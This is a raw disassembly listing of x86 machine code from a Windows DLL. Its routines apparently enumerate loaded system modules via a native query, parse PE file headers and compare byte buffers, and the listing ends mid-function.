1000c7eb:	53                   	push   %ebx
1000c7ec:	8b 5d 10             	mov    0x10(%ebp),%ebx
1000c7ef:	56                   	push   %esi
1000c7f0:	57                   	push   %edi
1000c7f1:	33 ff                	xor    %edi,%edi
1000c7f3:	3b df                	cmp    %edi,%ebx
1000c7f5:	0f 84 91 00 00 00    	je     0x1000c88c
1000c7fb:	8b 75 14             	mov    0x14(%ebp),%esi
1000c7fe:	3b f7                	cmp    %edi,%esi
1000c800:	0f 84 86 00 00 00    	je     0x1000c88c
1000c806:	39 3d 40 08 01 10    	cmp    %edi,0x10010840
1000c80c:	75 20                	jne    0x1000c82e
1000c80e:	68 40 03 01 10       	push   $0x10010340
1000c813:	ff 15 f4 e0 00 10    	call   *0x1000e0f4
1000c819:	68 10 07 01 10       	push   $0x10010710
1000c81e:	50                   	push   %eax
1000c81f:	ff 15 1c e1 00 10    	call   *0x1000e11c
1000c825:	3b c7                	cmp    %edi,%eax
1000c827:	a3 40 08 01 10       	mov    %eax,0x10010840
1000c82c:	74 5e                	je     0x1000c88c
1000c82e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000c832:	89 3b                	mov    %edi,(%ebx)
1000c834:	8b 5d 18             	mov    0x18(%ebp),%ebx
1000c837:	89 3e                	mov    %edi,(%esi)
1000c839:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
1000c83d:	75 0e                	jne    0x1000c84d
1000c83f:	81 c3 00 04 00 00    	add    $0x400,%ebx
1000c845:	81 fb 00 28 00 00    	cmp    $0x2800,%ebx
1000c84b:	77 33                	ja     0x1000c880
1000c84d:	53                   	push   %ebx
1000c84e:	57                   	push   %edi
1000c84f:	ff 15 dc e1 00 10    	call   *0x1000e1dc
1000c855:	8b f0                	mov    %eax,%esi
1000c857:	59                   	pop    %ecx
1000c858:	85 f6                	test   %esi,%esi
1000c85a:	59                   	pop    %ecx
1000c85b:	74 23                	je     0x1000c880
1000c85d:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000c860:	8b fe                	mov    %esi,%edi
1000c862:	50                   	push   %eax
1000c863:	53                   	push   %ebx
1000c864:	56                   	push   %esi
1000c865:	ff 75 08             	push   0x8(%ebp)
1000c868:	ff 75 0c             	push   0xc(%ebp)
1000c86b:	ff 15 40 08 01 10    	call   *0x10010840
1000c871:	3d 04 00 00 c0       	cmp    $0xc0000004,%eax
1000c876:	75 1b                	jne    0x1000c893
1000c878:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
1000c87c:	75 19                	jne    0x1000c897
1000c87e:	eb b9                	jmp    0x1000c839
1000c880:	85 ff                	test   %edi,%edi
1000c882:	74 08                	je     0x1000c88c
1000c884:	57                   	push   %edi
1000c885:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
1000c88b:	59                   	pop    %ecx
1000c88c:	32 c0                	xor    %al,%al
1000c88e:	5f                   	pop    %edi
1000c88f:	5e                   	pop    %esi
1000c890:	5b                   	pop    %ebx
1000c891:	c9                   	leave
1000c892:	c3                   	ret
1000c893:	85 c0                	test   %eax,%eax
1000c895:	74 07                	je     0x1000c89e
1000c897:	85 f6                	test   %esi,%esi
1000c899:	74 f1                	je     0x1000c88c
1000c89b:	56                   	push   %esi
1000c89c:	eb e7                	jmp    0x1000c885
1000c89e:	8b 45 10             	mov    0x10(%ebp),%eax
1000c8a1:	8b 4d 14             	mov    0x14(%ebp),%ecx
1000c8a4:	89 30                	mov    %esi,(%eax)
1000c8a6:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000c8a9:	89 01                	mov    %eax,(%ecx)
1000c8ab:	b0 01                	mov    $0x1,%al
1000c8ad:	eb df                	jmp    0x1000c88e
1000c8af:	55                   	push   %ebp
1000c8b0:	8b ec                	mov    %esp,%ebp
1000c8b2:	56                   	push   %esi
1000c8b3:	8b 75 0c             	mov    0xc(%ebp),%esi
1000c8b6:	57                   	push   %edi
1000c8b7:	33 ff                	xor    %edi,%edi
1000c8b9:	3b f7                	cmp    %edi,%esi
1000c8bb:	74 4b                	je     0x1000c908
1000c8bd:	8d 45 0c             	lea    0xc(%ebp),%eax
1000c8c0:	89 7d 0c             	mov    %edi,0xc(%ebp)
1000c8c3:	50                   	push   %eax
1000c8c4:	ff 75 08             	push   0x8(%ebp)
1000c8c7:	ff 15 74 e1 00 10    	call   *0x1000e174
1000c8cd:	57                   	push   %edi
1000c8ce:	57                   	push   %edi
1000c8cf:	57                   	push   %edi
1000c8d0:	6a 02                	push   $0x2
1000c8d2:	57                   	push   %edi
1000c8d3:	89 46 08             	mov    %eax,0x8(%esi)
1000c8d6:	8b 45 0c             	mov    0xc(%ebp),%eax
1000c8d9:	ff 75 08             	push   0x8(%ebp)
1000c8dc:	89 46 0c             	mov    %eax,0xc(%esi)
1000c8df:	ff 15 10 e1 00 10    	call   *0x1000e110
1000c8e5:	3b c7                	cmp    %edi,%eax
1000c8e7:	89 06                	mov    %eax,(%esi)
1000c8e9:	74 1d                	je     0x1000c908
1000c8eb:	57                   	push   %edi
1000c8ec:	57                   	push   %edi
1000c8ed:	57                   	push   %edi
1000c8ee:	6a 04                	push   $0x4
1000c8f0:	50                   	push   %eax
1000c8f1:	ff 15 0c e1 00 10    	call   *0x1000e10c
1000c8f7:	3b c7                	cmp    %edi,%eax
1000c8f9:	89 46 04             	mov    %eax,0x4(%esi)
1000c8fc:	75 0e                	jne    0x1000c90c
1000c8fe:	ff 36                	push   (%esi)
1000c900:	ff 15 30 e1 00 10    	call   *0x1000e130
1000c906:	89 3e                	mov    %edi,(%esi)
1000c908:	32 c0                	xor    %al,%al
1000c90a:	eb 02                	jmp    0x1000c90e
1000c90c:	b0 01                	mov    $0x1,%al
1000c90e:	5f                   	pop    %edi
1000c90f:	5e                   	pop    %esi
1000c910:	5d                   	pop    %ebp
1000c911:	c3                   	ret
1000c912:	56                   	push   %esi
1000c913:	8b 74 24 08          	mov    0x8(%esp),%esi
1000c917:	85 f6                	test   %esi,%esi
1000c919:	75 04                	jne    0x1000c91f
1000c91b:	32 c0                	xor    %al,%al
1000c91d:	5e                   	pop    %esi
1000c91e:	c3                   	ret
1000c91f:	ff 36                	push   (%esi)
1000c921:	ff 15 30 e1 00 10    	call   *0x1000e130
1000c927:	83 26 00             	andl   $0x0,(%esi)
1000c92a:	83 66 04 00          	andl   $0x0,0x4(%esi)
1000c92e:	b0 01                	mov    $0x1,%al
1000c930:	5e                   	pop    %esi
1000c931:	c3                   	ret
1000c932:	55                   	push   %ebp
1000c933:	8b ec                	mov    %esp,%ebp
1000c935:	6a ff                	push   $0xffffffff
1000c937:	68 10 ef 00 10       	push   $0x1000ef10
1000c93c:	68 00 c6 00 10       	push   $0x1000c600
1000c941:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000c947:	50                   	push   %eax
1000c948:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000c94f:	83 ec 20             	sub    $0x20,%esp
1000c952:	53                   	push   %ebx
1000c953:	56                   	push   %esi
1000c954:	57                   	push   %edi
1000c955:	33 ff                	xor    %edi,%edi
1000c957:	39 7d 08             	cmp    %edi,0x8(%ebp)
1000c95a:	0f 84 99 00 00 00    	je     0x1000c9f9
1000c960:	89 7d e4             	mov    %edi,-0x1c(%ebp)
1000c963:	89 7d e0             	mov    %edi,-0x20(%ebp)
1000c966:	89 7d fc             	mov    %edi,-0x4(%ebp)
1000c969:	57                   	push   %edi
1000c96a:	8d 45 e0             	lea    -0x20(%ebp),%eax
1000c96d:	50                   	push   %eax
1000c96e:	8d 45 e4             	lea    -0x1c(%ebp),%eax
1000c971:	50                   	push   %eax
1000c972:	6a 0b                	push   $0xb
1000c974:	e8 77 0b 00 00       	call   0x1000d4f0
1000c979:	83 c4 10             	add    $0x10,%esp
1000c97c:	84 c0                	test   %al,%al
1000c97e:	74 53                	je     0x1000c9d3
1000c980:	8b 45 e4             	mov    -0x1c(%ebp),%eax
1000c983:	3b c7                	cmp    %edi,%eax
1000c985:	74 4c                	je     0x1000c9d3
1000c987:	39 7d e0             	cmp    %edi,-0x20(%ebp)
1000c98a:	74 47                	je     0x1000c9d3
1000c98c:	8b d8                	mov    %eax,%ebx
1000c98e:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
1000c991:	8d 70 04             	lea    0x4(%eax),%esi
1000c994:	89 75 dc             	mov    %esi,-0x24(%ebp)
1000c997:	21 7d d8             	and    %edi,-0x28(%ebp)
1000c99a:	8b 45 d8             	mov    -0x28(%ebp),%eax
1000c99d:	3b 03                	cmp    (%ebx),%eax
1000c99f:	73 30                	jae    0x1000c9d1
1000c9a1:	69 c0 1c 01 00 00    	imul   $0x11c,%eax,%eax
1000c9a7:	8d 3c 30             	lea    (%eax,%esi,1),%edi
1000c9aa:	0f b7 4f 1a          	movzwl 0x1a(%edi),%ecx
1000c9ae:	03 c8                	add    %eax,%ecx
1000c9b0:	8d 44 31 1c          	lea    0x1c(%ecx,%esi,1),%eax
1000c9b4:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000c9b7:	ff 75 08             	push   0x8(%ebp)
1000c9ba:	50                   	push   %eax
1000c9bb:	ff 15 a0 e1 00 10    	call   *0x1000e1a0
1000c9c1:	59                   	pop    %ecx
1000c9c2:	59                   	pop    %ecx
1000c9c3:	85 c0                	test   %eax,%eax
1000c9c5:	75 05                	jne    0x1000c9cc
1000c9c7:	8b 7f 08             	mov    0x8(%edi),%edi
1000c9ca:	eb 07                	jmp    0x1000c9d3
1000c9cc:	ff 45 d8             	incl   -0x28(%ebp)
1000c9cf:	eb c9                	jmp    0x1000c99a
1000c9d1:	33 ff                	xor    %edi,%edi
1000c9d3:	6a ff                	push   $0xffffffff
1000c9d5:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000c9d8:	50                   	push   %eax
1000c9d9:	e8 f8 0a 00 00       	call   0x1000d4d6
1000c9de:	59                   	pop    %ecx
1000c9df:	59                   	pop    %ecx
1000c9e0:	8b c7                	mov    %edi,%eax
1000c9e2:	eb 17                	jmp    0x1000c9fb
1000c9e4:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
1000c9e8:	74 0e                	je     0x1000c9f8
1000c9ea:	ff 75 e4             	push   -0x1c(%ebp)
1000c9ed:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
1000c9f3:	59                   	pop    %ecx
1000c9f4:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
1000c9f8:	c3                   	ret
1000c9f9:	33 c0                	xor    %eax,%eax
1000c9fb:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000c9fe:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000ca05:	5f                   	pop    %edi
1000ca06:	5e                   	pop    %esi
1000ca07:	5b                   	pop    %ebx
1000ca08:	c9                   	leave
1000ca09:	c3                   	ret
1000ca0a:	55                   	push   %ebp
1000ca0b:	8b ec                	mov    %esp,%ebp
1000ca0d:	6a ff                	push   $0xffffffff
1000ca0f:	68 20 ef 00 10       	push   $0x1000ef20
1000ca14:	68 00 c6 00 10       	push   $0x1000c600
1000ca19:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
1000ca1f:	50                   	push   %eax
1000ca20:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000ca27:	51                   	push   %ecx
1000ca28:	51                   	push   %ecx
1000ca29:	53                   	push   %ebx
1000ca2a:	56                   	push   %esi
1000ca2b:	57                   	push   %edi
1000ca2c:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000ca2f:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000ca32:	33 c0                	xor    %eax,%eax
1000ca34:	3b c8                	cmp    %eax,%ecx
1000ca36:	74 46                	je     0x1000ca7e
1000ca38:	39 45 10             	cmp    %eax,0x10(%ebp)
1000ca3b:	74 41                	je     0x1000ca7e
1000ca3d:	8b 75 14             	mov    0x14(%ebp),%esi
1000ca40:	3b f0                	cmp    %eax,%esi
1000ca42:	74 3a                	je     0x1000ca7e
1000ca44:	8b 7d 0c             	mov    0xc(%ebp),%edi
1000ca47:	8d 14 37             	lea    (%edi,%esi,1),%edx
1000ca4a:	3b 41 0c             	cmp    0xc(%ecx),%eax
1000ca4d:	72 07                	jb     0x1000ca56
1000ca4f:	77 2d                	ja     0x1000ca7e
1000ca51:	3b 51 08             	cmp    0x8(%ecx),%edx
1000ca54:	77 28                	ja     0x1000ca7e
1000ca56:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000ca59:	56                   	push   %esi
1000ca5a:	8b 41 04             	mov    0x4(%ecx),%eax
1000ca5d:	03 c7                	add    %edi,%eax
1000ca5f:	50                   	push   %eax
1000ca60:	ff 75 10             	push   0x10(%ebp)
1000ca63:	e8 b4 08 00 00       	call   0x1000d31c
1000ca68:	83 c4 0c             	add    $0xc,%esp
1000ca6b:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000ca6f:	b0 01                	mov    $0x1,%al
1000ca71:	eb 0d                	jmp    0x1000ca80
1000ca73:	6a 01                	push   $0x1
1000ca75:	58                   	pop    %eax
1000ca76:	c3                   	ret
1000ca77:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000ca7a:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000ca7e:	32 c0                	xor    %al,%al
1000ca80:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000ca83:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000ca8a:	5f                   	pop    %edi
1000ca8b:	5e                   	pop    %esi
1000ca8c:	5b                   	pop    %ebx
1000ca8d:	c9                   	leave
1000ca8e:	c3                   	ret
1000ca8f:	56                   	push   %esi
1000ca90:	8b 74 24 10          	mov    0x10(%esp),%esi
1000ca94:	57                   	push   %edi
1000ca95:	33 ff                	xor    %edi,%edi
1000ca97:	85 f6                	test   %esi,%esi
1000ca99:	7e 16                	jle    0x1000cab1
1000ca9b:	8b 54 24 10          	mov    0x10(%esp),%edx
1000ca9f:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
1000caa3:	2b ca                	sub    %edx,%ecx
1000caa5:	8a 04 11             	mov    (%ecx,%edx,1),%al
1000caa8:	3a 02                	cmp    (%edx),%al
1000caaa:	75 01                	jne    0x1000caad
1000caac:	47                   	inc    %edi
1000caad:	42                   	inc    %edx
1000caae:	4e                   	dec    %esi
1000caaf:	75 f4                	jne    0x1000caa5
1000cab1:	8b c7                	mov    %edi,%eax
1000cab3:	5f                   	pop    %edi
1000cab4:	5e                   	pop    %esi
1000cab5:	c3                   	ret
1000cab6:	55                   	push   %ebp
1000cab7:	8b ec                	mov    %esp,%ebp
1000cab9:	51                   	push   %ecx
1000caba:	51                   	push   %ecx
1000cabb:	53                   	push   %ebx
1000cabc:	56                   	push   %esi
1000cabd:	8b 35 18 e1 00 10    	mov    0x1000e118,%esi
1000cac3:	33 db                	xor    %ebx,%ebx
1000cac5:	57                   	push   %edi
1000cac6:	53                   	push   %ebx
1000cac7:	53                   	push   %ebx
1000cac8:	6a 3c                	push   $0x3c
1000caca:	ff 75 08             	push   0x8(%ebp)
1000cacd:	89 5d f8             	mov    %ebx,-0x8(%ebp)
1000cad0:	ff d6                	call   *%esi
1000cad2:	83 f8 3c             	cmp    $0x3c,%eax
1000cad5:	74 07                	je     0x1000cade
1000cad7:	6a fd                	push   $0xfffffffd
1000cad9:	e9 9f 00 00 00       	jmp    0x1000cb7d
1000cade:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000cae1:	8b 3d 90 e0 00 10    	mov    0x1000e090,%edi
1000cae7:	53                   	push   %ebx
1000cae8:	50                   	push   %eax
1000cae9:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000caec:	6a 04                	push   $0x4
1000caee:	50                   	push   %eax
1000caef:	ff 75 08             	push   0x8(%ebp)
1000caf2:	ff d7                	call   *%edi
1000caf4:	53                   	push   %ebx
1000caf5:	53                   	push   %ebx
1000caf6:	ff 75 f8             	push   -0x8(%ebp)
1000caf9:	89 5d fc             	mov    %ebx,-0x4(%ebp)
1000cafc:	ff 75 08             	push   0x8(%ebp)
1000caff:	ff d6                	call   *%esi
1000cb01:	3b 45 f8             	cmp    -0x8(%ebp),%eax
1000cb04:	75 d1                	jne    0x1000cad7
1000cb06:	be f8 00 00 00       	mov    $0xf8,%esi
1000cb0b:	56                   	push   %esi
1000cb0c:	6a 40                	push   $0x40
1000cb0e:	ff 15 c4 e0 00 10    	call   *0x1000e0c4
1000cb14:	8b 5d 0c             	mov    0xc(%ebp),%ebx
1000cb17:	8d 4d fc             	lea    -0x4(%ebp),%ecx
1000cb1a:	6a 00                	push   $0x0
1000cb1c:	51                   	push   %ecx
1000cb1d:	56                   	push   %esi
1000cb1e:	50                   	push   %eax
1000cb1f:	ff 75 08             	push   0x8(%ebp)
1000cb22:	89 03                	mov    %eax,(%ebx)
1000cb24:	ff d7                	call   *%edi
1000cb26:	39 75 fc             	cmp    %esi,-0x4(%ebp)
1000cb29:	74 0d                	je     0x1000cb38
1000cb2b:	ff 33                	push   (%ebx)
1000cb2d:	ff 15 c0 e0 00 10    	call   *0x1000e0c0
1000cb33:	83 23 00             	andl   $0x0,(%ebx)
1000cb36:	eb 43                	jmp    0x1000cb7b
1000cb38:	8b 03                	mov    (%ebx),%eax
1000cb3a:	0f b7 40 06          	movzwl 0x6(%eax),%eax
1000cb3e:	8d 34 80             	lea    (%eax,%eax,4),%esi
1000cb41:	c1 e6 03             	shl    $0x3,%esi
1000cb44:	56                   	push   %esi
1000cb45:	6a 40                	push   $0x40
1000cb47:	ff 15 c4 e0 00 10    	call   *0x1000e0c4
1000cb4d:	8b 4d 10             	mov    0x10(%ebp),%ecx
1000cb50:	6a 00                	push   $0x0
1000cb52:	89 01                	mov    %eax,(%ecx)
1000cb54:	8d 4d fc             	lea    -0x4(%ebp),%ecx
1000cb57:	51                   	push   %ecx
1000cb58:	56                   	push   %esi
1000cb59:	50                   	push   %eax
1000cb5a:	ff 75 08             	push   0x8(%ebp)
1000cb5d:	ff d7                	call   *%edi
1000cb5f:	39 75 fc             	cmp    %esi,-0x4(%ebp)
1000cb62:	74 1c                	je     0x1000cb80
1000cb64:	ff 33                	push   (%ebx)
1000cb66:	8b 35 c0 e0 00 10    	mov    0x1000e0c0,%esi
1000cb6c:	ff d6                	call   *%esi
1000cb6e:	8b 7d 10             	mov    0x10(%ebp),%edi
1000cb71:	ff 37                	push   (%edi)
1000cb73:	ff d6                	call   *%esi
1000cb75:	83 23 00             	andl   $0x0,(%ebx)
1000cb78:	83 27 00             	andl   $0x0,(%edi)
1000cb7b:	6a fc                	push   $0xfffffffc
1000cb7d:	58                   	pop    %eax
1000cb7e:	eb 02                	jmp    0x1000cb82
1000cb80:	33 c0                	xor    %eax,%eax
1000cb82:	5f                   	pop    %edi
1000cb83:	5e                   	pop    %esi
1000cb84:	5b                   	pop    %ebx
1000cb85:	c9                   	leave
1000cb86:	c3                   	ret
1000cb87:	55                   	push   %ebp
1000cb88:	8b ec                	mov    %esp,%ebp
1000cb8a:	8b 45 08             	mov    0x8(%ebp),%eax
1000cb8d:	33 c9                	xor    %ecx,%ecx
1000cb8f:	56                   	push   %esi
1000cb90:	3b c1                	cmp    %ecx,%eax
1000cb92:	57                   	push   %edi
1000cb93:	74 32                	je     0x1000cbc7
1000cb95:	39 4d 10             	cmp    %ecx,0x10(%ebp)
1000cb98:	74 2d                	je     0x1000cbc7
1000cb9a:	8b 75 0c             	mov    0xc(%ebp),%esi
1000cb9d:	8b 7d 14             	mov    0x14(%ebp),%edi
1000cba0:	3b 48 0c             	cmp    0xc(%eax),%ecx
1000cba3:	8d 14 3e             	lea    (%esi,%edi,1),%edx
1000cba6:	72 0b                	jb     0x1000cbb3
1000cba8:	77 05                	ja     0x1000cbaf
1000cbaa:	3b 50 08             	cmp    0x8(%eax),%edx
1000cbad:	76 04                	jbe    0x1000cbb3
1000cbaf:	6a fd                	push   $0xfffffffd
1000cbb1:	eb 16                	jmp    0x1000cbc9
1000cbb3:	8b 40 04             	mov    0x4(%eax),%eax
1000cbb6:	57                   	push   %edi
1000cbb7:	03 c6                	add    %esi,%eax
1000cbb9:	50                   	push   %eax
1000cbba:	ff 75 10             	push   0x10(%ebp)
1000cbbd:	e8 cd fe ff ff       	call   0x1000ca8f
1000cbc2:	83 c4 0c             	add    $0xc,%esp
1000cbc5:	eb 03                	jmp    0x1000cbca
1000cbc7:	6a 57                	push   $0x57
1000cbc9:	58                   	pop    %eax
1000cbca:	5f                   	pop    %edi
1000cbcb:	5e                   	pop    %esi
1000cbcc:	5d                   	pop    %ebp
1000cbcd:	c3                   	ret
1000cbce:	ff 25 18 e2 00 10    	jmp    *0x1000e218
1000cbd4:	cc                   	int3
1000cbd5:	cc                   	int3
1000cbd6:	cc                   	int3
1000cbd7:	cc                   	int3
1000cbd8:	cc                   	int3
1000cbd9:	cc                   	int3
1000cbda:	cc                   	int3
1000cbdb:	cc                   	int3
1000cbdc:	cc                   	int3
1000cbdd:	cc                   	int3
1000cbde:	cc                   	int3
1000cbdf:	cc                   	int3
1000cbe0:	51                   	push   %ecx
1000cbe1:	53                   	push   %ebx
1000cbe2:	55                   	push   %ebp
1000cbe3:	56                   	push   %esi
1000cbe4:	8b 74 24 14          	mov    0x14(%esp),%esi
1000cbe8:	85 f6                	test   %esi,%esi
1000cbea:	57                   	push   %edi
1000cbeb:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
1000cbf2:	00 
1000cbf3:	75 08                	jne    0x1000cbfd
1000cbf5:	5f                   	pop    %edi
1000cbf6:	5e                   	pop    %esi
1000cbf7:	5d                   	pop    %ebp
1000cbf8:	33 c0                	xor    %eax,%eax
1000cbfa:	5b                   	pop    %ebx
1000cbfb:	59                   	pop    %ecx
1000cbfc:	c3                   	ret
1000cbfd:	8b 6c 24 20          	mov    0x20(%esp),%ebp
1000cc01:	85 ed                	test   %ebp,%ebp
1000cc03:	75 08                	jne    0x1000cc0d
1000cc05:	5f                   	pop    %edi
1000cc06:	5e                   	pop    %esi
1000cc07:	5d                   	pop    %ebp
1000cc08:	33 c0                	xor    %eax,%eax
1000cc0a:	5b                   	pop    %ebx
1000cc0b:	59                   	pop    %ecx
1000cc0c:	c3                   	ret
1000cc0d:	8b 5c 24 24          	mov    0x24(%esp),%ebx
1000cc11:	85 db                	test   %ebx,%ebx
1000cc13:	75 08                	jne    0x1000cc1d
1000cc15:	5f                   	pop    %edi
1000cc16:	5e                   	pop    %esi
1000cc17:	5d                   	pop    %ebp
1000cc18:	33 c0                	xor    %eax,%eax
1000cc1a:	5b                   	pop    %ebx
1000cc1b:	59                   	pop    %ecx
1000cc1c:	c3                   	ret
1000cc1d:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
1000cc21:	85 ff                	test   %edi,%edi
1000cc23:	75 08                	jne    0x1000cc2d
1000cc25:	5f                   	pop    %edi
1000cc26:	5e                   	pop    %esi
1000cc27:	5d                   	pop    %ebp
1000cc28:	33 c0                	xor    %eax,%eax
1000cc2a:	5b                   	pop    %ebx
1000cc2b:	59                   	pop    %ecx
1000cc2c:	c3                   	ret
1000cc2d:	6a 04                	push   $0x4
1000cc2f:	6a 04                	push   $0x4
1000cc31:	6a 04                	push   $0x4
1000cc33:	6a 04                	push   $0x4
1000cc35:	6a 04                	push   $0x4
1000cc37:	6a 04                	push   $0x4
1000cc39:	6a 04                	push   $0x4
1000cc3b:	6a 04                	push   $0x4
1000cc3d:	6a 02                	push   $0x2
1000cc3f:	68 00 92 00 00       	push   $0x9200
1000cc44:	e8 77 03 00 00       	call   0x1000cfc0
1000cc49:	83 c4 28             	add    $0x28,%esp
1000cc4c:	85 c0                	test   %eax,%eax
1000cc4e:	74 08                	je     0x1000cc58
1000cc50:	5f                   	pop    %edi
1000cc51:	5e                   	pop    %esi
1000cc52:	5d                   	pop    %ebp
1000cc53:	33 c0                	xor    %eax,%eax
1000cc55:	5b                   	pop    %ebx
1000cc56:	59                   	pop    %ecx
1000cc57:	c3                   	ret
1000cc58:	80 3e 40             	cmpb   $0x40,(%esi)
1000cc5b:	74 08                	je     0x1000cc65
1000cc5d:	5f                   	pop    %edi
1000cc5e:	5e                   	pop    %esi
1000cc5f:	5d                   	pop    %ebp
1000cc60:	33 c0                	xor    %eax,%eax
1000cc62:	5b                   	pop    %ebx
1000cc63:	59                   	pop    %ecx
1000cc64:	c3                   	ret
1000cc65:	39 5e 08             	cmp    %ebx,0x8(%esi)
1000cc68:	76 08                	jbe    0x1000cc72
1000cc6a:	5f                   	pop    %edi
1000cc6b:	5e                   	pop    %esi
1000cc6c:	5d                   	pop    %ebp
1000cc6d:	33 c0                	xor    %eax,%eax
1000cc6f:	5b                   	pop    %ebx
1000cc70:	59                   	pop    %ecx
1000cc71:	c3                   	ret
1000cc72:	8d 44 24 10          	lea    0x10(%esp),%eax
1000cc76:	6a 00                	push   $0x0
1000cc78:	50                   	push   %eax
1000cc79:	83 c7 f4             	add    $0xfffffff4,%edi
1000cc7c:	55                   	push   %ebp
1000cc7d:	83 c6 0c             	add    $0xc,%esi
1000cc80:	57                   	push   %edi
1000cc81:	56                   	push   %esi
1000cc82:	e8 d9 03 00 00       	call   0x1000d060
1000cc87:	8b 4c 24 24          	mov    0x24(%esp),%ecx
1000cc8b:	83 c4 14             	add    $0x14,%esp
1000cc8e:	f7 d8                	neg    %eax
1000cc90:	1b c0                	sbb    %eax,%eax
1000cc92:	5f                   	pop    %edi
1000cc93:	f7 d0                	not    %eax
1000cc95:	5e                   	pop    %esi
1000cc96:	5d                   	pop    %ebp
1000cc97:	23 c1                	and    %ecx,%eax
1000cc99:	5b                   	pop    %ebx
1000cc9a:	59                   	pop    %ecx
1000cc9b:	c3                   	ret
1000cc9c:	90                   	nop
1000cc9d:	90                   	nop
1000cc9e:	90                   	nop
1000cc9f:	90                   	nop
1000cca0:	83 ec 20             	sub    $0x20,%esp
1000cca3:	56                   	push   %esi
1000cca4:	e8 87 01 00 00       	call   0x1000ce30
1000cca9:	8b f0                	mov    %eax,%esi
1000ccab:	83 e6 01             	and    $0x1,%esi
1000ccae:	e8 7d 01 00 00       	call   0x1000ce30
1000ccb3:	23 f0                	and    %eax,%esi
1000ccb5:	83 fe 01             	cmp    $0x1,%esi
1000ccb8:	74 08                	je     0x1000ccc2
1000ccba:	83 c8 ff             	or     $0xffffffff,%eax
1000ccbd:	5e                   	pop    %esi
1000ccbe:	83 c4 20             	add    $0x20,%esp
1000ccc1:	c3                   	ret
1000ccc2:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
1000ccc9:	00 
1000ccca:	66 c7 44 24 14 00 00 	movw   $0x0,0x14(%esp)
1000ccd1:	33 c0                	xor    %eax,%eax
1000ccd3:	88 44 04 14          	mov    %al,0x14(%esp,%eax,1)
1000ccd7:	40                   	inc    %eax
1000ccd8:	83 f8 10             	cmp    $0x10,%eax
1000ccdb:	7c f6                	jl     0x1000ccd3
1000ccdd:	8b 4c 24 14          	mov    0x14(%esp),%ecx
1000cce1:	33 c0                	xor    %eax,%eax
1000cce3:	81 f9 00 01 02 03    	cmp    $0x3020100,%ecx
1000cce9:	ba 00 01 00 00       	mov    $0x100,%edx
1000ccee:	0f 94 c0             	sete   %al
1000ccf1:	33 c9                	xor    %ecx,%ecx
1000ccf3:	66 39 54 24 14       	cmp    %dx,0x14(%esp)
1000ccf8:	0f 94 c1             	sete   %cl
1000ccfb:	23 c1                	and    %ecx,%eax
1000ccfd:	83 e0 01             	and    $0x1,%eax
1000cd00:	8b f0                	mov    %eax,%esi
1000cd02:	83 e6 01             	and    $0x1,%esi
1000cd05:	83 fe 01             	cmp    $0x1,%esi
1000cd08:	75 50                	jne    0x1000cd5a
1000cd0a:	33 c0                	xor    %eax,%eax
1000cd0c:	8d 4c 24 04          	lea    0x4(%esp),%ecx
1000cd10:	66 8b 74 04 14       	mov    0x14(%esp,%eax,1),%si
1000cd15:	40                   	inc    %eax
1000cd16:	66 89 31             	mov    %si,(%ecx)
1000cd19:	83 c1 02             	add    $0x2,%ecx
1000cd1c:	83 f8 04             	cmp    $0x4,%eax
1000cd1f:	7c ef                	jl     0x1000cd10
1000cd21:	33 c0                	xor    %eax,%eax
1000cd23:	66 81 7c 24 0a 03 04 	cmpw   $0x403,0xa(%esp)
1000cd2a:	0f 94 c0             	sete   %al
1000cd2d:	33 c9                	xor    %ecx,%ecx
1000cd2f:	66 81 7c 24 08 02 03 	cmpw   $0x302,0x8(%esp)
1000cd36:	0f 94 c1             	sete   %cl
1000cd39:	23 c1                	and    %ecx,%eax
1000cd3b:	33 c9                	xor    %ecx,%ecx
1000cd3d:	66 81 7c 24 06 01 02 	cmpw   $0x201,0x6(%esp)
1000cd44:	0f 94 c1             	sete   %cl
1000cd47:	23 c1                	and    %ecx,%eax
1000cd49:	33 c9                	xor    %ecx,%ecx
1000cd4b:	66 39 54 24 04       	cmp    %dx,0x4(%esp)
1000cd50:	0f 94 c1             	sete   %cl
1000cd53:	23 c1                	and    %ecx,%eax
1000cd55:	83 e0 01             	and    $0x1,%eax
1000cd58:	8b f0                	mov    %eax,%esi
1000cd5a:	83 e6 01             	and    $0x1,%esi
1000cd5d:	83 fe 01             	cmp    $0x1,%esi
1000cd60:	75 5c                	jne    0x1000cdbe
1000cd62:	33 c0                	xor    %eax,%eax
1000cd64:	8d 4c 24 04          	lea    0x4(%esp),%ecx
1000cd68:	8b 54 04 14          	mov    0x14(%esp,%eax,1),%edx
1000cd6c:	40                   	inc    %eax
1000cd6d:	89 11                	mov    %edx,(%ecx)
1000cd6f:	83 c1 04             	add    $0x4,%ecx
1000cd72:	83 f8 04             	cmp    $0x4,%eax
1000cd75:	7c f1                	jl     0x1000cd68
